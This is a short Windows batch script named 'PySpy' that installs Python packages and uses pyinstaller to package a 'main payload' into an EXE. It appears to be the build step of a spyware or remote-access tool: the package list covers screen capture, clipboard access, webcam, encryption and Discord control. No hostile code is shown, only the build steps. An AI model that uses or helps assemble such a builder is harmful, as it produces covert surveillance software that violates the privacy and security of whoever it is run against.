@echo off
title PySpy
echo Please setup config.json before continuing. If you already have, continue.
pause

echo Installing pip
python -m pip install --upgrade pip
echo Installed pip

echo Installing Packages
pip install pyinstaller psutil discord.py pyautogui numpy opencv-python pyperclip cryptography pyttsx3 requests pywin32 pycryptodome
echo Installed Packages

echo Compiling scripts
python build.py
echo Compiled scripts

echo Packaging main payload
pyinstaller script.spec
echo Packaged main payload

echo Build completed. Final EXE is in the dist folder.
echo Run rebuild.bat if there was an error or you would like to rebuild the EXE.
pause
exit /b 0